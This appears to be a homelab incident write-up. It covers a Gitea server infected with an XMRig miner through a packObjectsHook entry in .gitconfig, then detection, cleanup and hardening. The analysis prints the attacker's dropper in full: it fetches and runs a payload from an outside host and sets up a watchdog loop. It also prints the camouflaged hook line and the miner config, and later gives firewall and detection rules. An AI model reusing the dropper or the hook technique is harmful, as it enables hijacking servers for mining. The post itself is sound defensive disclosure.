---
title: "Incident: XMRig injected into my Gitea via packObjectsHook"
date: 2026-09-19T21:00:00+00:00
draft: false
tags: ["cybersecurity", "homelab", "selfhosted", "infosec", "blue-team", "soc", "incident-response", "gitops", "build-in-public"]
summary: "My self-hosted Gitea was compromised by an XMRig cryptominer deployed via the git packObjectsHook mechanism. A walkthrough of detection, analysis, and remediation."
description: "Real-world security incident analysis: XMRig injection into Gitea via packObjectsHook in .gitconfig — attack vector, persistence mechanism, remediation, and upgrade to 1.27.3."
author: "Bojemoi"
ShowToc: true
ShowReadingTime: true
---

My Hugo CI/CD had been failing for a month. I assumed it was a runner bug. It was a Monero miner.

## The symptom

The blog's Gitea Actions workflow was failing at the `git clone` step with exit code 128:

```
remote: wget: can't open '/data/gitea/.sys_health_s3': Text file busy
remote: curl: (23) client returned ERROR on write of 16212 bytes
fatal: early EOF
fatal: fetch-pack: invalid index-pack output
```

`Text file busy` on a hidden file inside `/data/gitea/`. Not a runner bug.

## The analysis

### The files

Inside `/data/gitea/home/` (the `git` user's home directory inside the Gitea container):

```
-rwxr-xr-x  8.3M  .sys_health_s3       ← ELF64 statically linked
-rwxr-xr-x   156  .wp_s2_cron          ← shell watchdog script
-rw-r--r--  1.2K  .sys_health_s3.json  ← XMRig config
-rw-r--r--     0  .s3w                  ← lock file
           p0_f3959c2a.sh               ← dropper
```

`file .sys_health_s3`: `ELF 64-bit LSB executable, x86-64, statically linked, stripped` — 8.3 MB. Classic XMRig.

The config confirms it:

```json
{
  "pools": [
    {"url": "gulf.moneroocean.stream:443",
     "user": "45ZSHJTQigW7gLTgpjCyCzCfENpNjFoWeE8vADaD3e3g9664KAqra3m4tbSJeNVtiF3zK4VgrA7caHxwgABX4T4H88gGC4b",
     "pass": "Gitea S2", "rig-id": "Gitea S2"}
  ]
}
```

Rig-id `Gitea S2` — the attacker named the rig after the service. Likely other compromised machines following the same pattern (`Gitea S1`, `S3`...).

### The persistence vector

The interesting part: the `git` user's `.gitconfig` inside the container.

```ini
[uploadpack]
    packObjectsHook = sh /data/gitea/home/p0_f3959c2a.sh ;#router: completed POST /api/internal/manager/add-logger ...
```

`packObjectsHook` is a legitimate git hook called during `git upload-pack` — that is, on **every `git clone`, `git fetch`, `git pull`** served by the server. The attacker used it to re-execute the dropper on every git operation.

The fake comments mimicking Gitea router logs (`#router: completed GET /bojemoi/blog/src/...`) are camouflage: they make the `.gitconfig` entry difficult to spot in a diff or audit.

### The dropper (`p0_f3959c2a.sh`)

```sh
D=; for x in /data/gitea /data/git /home/git /var/tmp /dev/shm /tmp; do
  touch $x/.s3w 2>/dev/null && D=$x && break
done
[ -n "$D" ] || D=/tmp
B=$D/.sys_health_s3
C=$D/.sys_health_s3.json

# Download the miner
(wget -qO $B https://sunnyeye.solarvest.my/health.bin || \
 curl -fsSL --max-time 60 -o $B https://sunnyeye.solarvest.my/health.bin)
(wget -qO $C https://sunnyeye.solarvest.my/p0_gitea_s2.json || \
 curl ...)

chmod +x $B
SZ=$(wc -c <$B 2>/dev/null || echo 0)

if [ "$SZ" -gt 1000000 ]; then
  pkill -f '[.]sys_health_s3' 2>/dev/null
  nohup $B --config=$C >/dev/null 2>&1 &
  # Install watchdog (cron or shell loop)
  W=$D/.wp_s2_cron
  printf '%s\n' '#!/bin/sh' \
    "pgrep -f '[.]sys_health_s3 --config' >/dev/null 2>&1 || nohup $B --config=$C >/dev/null 2>&1 &" > "$W"
  chmod +x "$W"
  # No crond on this system → fall back to while loop
  nohup sh -c "while sleep 180; do $W; done" >/dev/null 2>&1 &
fi
```

The script detects whether cron is available and installs persistence accordingly. Here, without crond, it deployed a `while sleep 180` watchdog.

The `wget` failing to overwrite a binary that is already executing (OS lock on a loaded ELF) produces the `Text file busy` error — which ends up in the `git upload-pack` output stream and corrupts the git pack protocol on the client side.

### Why the CI was failing

```
git clone → git upload-pack (server) → packObjectsHook → p0_f3959c2a.sh
→ wget tries to overwrite .sys_health_s3 (already running)
→ "Text file busy" on stderr
→ stderr injected into the pack-objects stream
→ git client: "fatal: early EOF" / "invalid index-pack output"
→ exit 128
```

The miner was sabotaging itself by trying to re-download on every clone.

## Remediation

### Immediate steps

```bash
# 1. Kill the processes
kill -9 $(ps aux | grep "while sleep 180" | grep -v grep | awk '{print $2}')
pkill -f sys_health_s3

# 2. Remove the files
rm -f /data/gitea/.sys_health_s3 .wp_s2_cron .sys_health_s3.json .s3w .wp_s2_wd.pid
rm -f /data/gitea/home/p0_f3959c2a.sh

# 3. Clean .gitconfig — remove all packObjectsHook entries
python3 -c "
lines = open('.gitconfig').readlines()
clean = [l for l in lines if 'packObjectsHook' not in l]
open('.gitconfig', 'w').writelines(clean)
"

# 4. Restart Gitea
docker restart gitea
```

### Verification

```bash
# .gitconfig clean?
grep -c packObjectsHook /data/gitea/home/.gitconfig
# → 0

# git clone working?
docker run --rm --network gitea_gitea-internal alpine \
  sh -c "apk add git -q && git clone http://gitea:3000/bojemoi/blog.git /tmp/t && echo OK"
# → OK
```

### Gitea upgrade

Version 1.25.3 (running for 9 months under the `latest` tag) likely had a vulnerability that allowed writing to `.gitconfig`. Upgraded to **1.27.3** and pinned the tag in `docker-compose.yml`:

```yaml
services:
  gitea:
    image: gitea/gitea:1.27.3  # no more "latest"
```

## What I should have done

- **Pin image versions** from the start — `latest` hides available updates AND makes it impossible to know what's actually running
- **Monitor hidden files** in Docker volumes (cron job: `find /data -name ".*" -newer /etc/passwd`)
- **CPU alerts** — a miner runs at constant high load. I have Prometheus/Grafana, I should have had a `node_cpu_usage > 80%` alert on the Lightsail instance

A failing CI isn't always a code bug.

## Hardening applied

### 1. Immutable `.gitconfig`

```bash
chattr +i /data/gitea/home/.gitconfig
```

`chattr +i` sets the immutable flag at the filesystem level (ext4/xfs). Even `root` cannot write to that file without removing the flag first — no process inside the container can modify it. This is the most direct protection against this specific vector.

```bash
lsattr /data/gitea/home/.gitconfig
# → ----i----------------- .gitconfig

echo "test" >> /data/gitea/home/.gitconfig
# → Operation not permitted
```

### 2. `app.ini` hardening

```ini
[security]
IMPORT_LOCAL_PATHS = false   ; block local repo imports (LFI vector)
DISABLE_GIT_HOOKS = true     ; Gitea won't execute server-side hooks
```

`DISABLE_GIT_HOOKS` prevents Gitea from running `pre-receive`, `update` and `post-receive` hooks in repositories — a distinct but related vector to `packObjectsHook`.

### 3. Outbound firewall — block mining pools

```bash
# Standard stratum ports
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 10001 -j DROP
iptables -A OUTPUT -p tcp --dport 14444 -j DROP

# Pool IPs found in this config
iptables -A OUTPUT -d 103.7.55.233 -j DROP   # gulf.moneroocean.stream
iptables -A OUTPUT -d 185.84.98.85 -j DROP   # pool.hashvault.pro
iptables -A OUTPUT -d 185.84.98.5  -j DROP

iptables-save > /etc/sysconfig/iptables
```

Even if a miner is dropped again, it can't reach a pool. This also covers TLS on port 443 toward these specific IPs — the `moneroocean.stream:443` pool used in this config is blocked.

### 4. Continuous monitoring — cron every 5 minutes

```bash
#!/bin/bash
# /usr/local/bin/gitea-watch.sh
GITEA_HOME="/home/docker/stacks/gitea/data/gitea"

# New hidden files created recently
find "$GITEA_HOME" -maxdepth 3 -name ".*" -type f -newer /tmp/.gitea-watch-last \
  | grep -v ".gitconfig$" | while read f; do
    echo "$(date -u) ALERT: new hidden file: $f" >> /var/log/gitea-security.log
done

# .gitconfig modified (should never change with chattr +i)
MTIME=$(stat -c %Y "$GITEA_HOME/home/.gitconfig")
[ "$MTIME" != "$(cat /tmp/.gitconfig-mtime 2>/dev/null)" ] && \
  echo "$(date -u) ALERT: .gitconfig modified!" >> /var/log/gitea-security.log

# Suspicious processes
for pat in sys_health wp_s2_cron xmrig; do
    pgrep -f "$pat" > /dev/null && \
      echo "$(date -u) ALERT: suspicious process: $pat" >> /var/log/gitea-security.log
done

# Connections to mining ports
ss -tnp | grep -E ":3333|:5555|:10001|:14444" | grep -v LISTEN && \
  echo "$(date -u) ALERT: mining connection detected" >> /var/log/gitea-security.log

touch /tmp/.gitea-watch-last
```

### 5. Runner registration token rotated

The runner registration token was hardcoded in plain text in `docker-compose.yml`. Replaced with a random value — the existing runner keeps its registration, but no new runner can be registered with the old token.

---

**Summary** (7 controls active):

| Control | Vector blocked |
|---------|----------------|
| `chattr +i .gitconfig` | `packObjectsHook` injection |
| `DISABLE_GIT_HOOKS` | Server-side repo hooks |
| `IMPORT_LOCAL_PATHS = false` | LFI via local import |
| Gitea 1.27.3 | Patched CVEs |
| iptables DROP mining ports/IPs | Pool connection impossible |
| Cron watch `*/5` | Fast re-infection detection |
| Runner token rotated | Rogue runner registration |

---

*Gitea 1.27.3, XMRig removed, packObjectsHook cleaned, 7 controls active.*
